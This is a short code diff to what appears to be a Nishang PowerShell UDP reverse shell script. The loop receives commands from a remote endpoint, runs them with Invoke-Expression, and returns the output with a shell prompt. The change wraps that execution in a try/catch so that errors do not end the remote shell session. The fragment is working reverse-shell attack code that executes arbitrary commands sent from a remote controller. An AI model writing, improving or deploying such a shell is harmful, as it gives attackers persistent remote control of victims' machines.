@@ -110,7 +110,15 @@ https://github.com/samratashok/nishang
     {
         $receivebytes = $client.Receive([ref]$endpoint)
         $returndata = ([text.encoding]::ASCII).GetString($receivebytes)
-        $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
+        
+        # Catch and swallow any exceptions to prevent closing the shell
+        try
+        {
+            $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
+        }
+        catch
+        {
+        }
 
         $sendback = $result +  'PS ' + (Get-Location).Path + '> '
         $x = ($error[0] | Out-String)
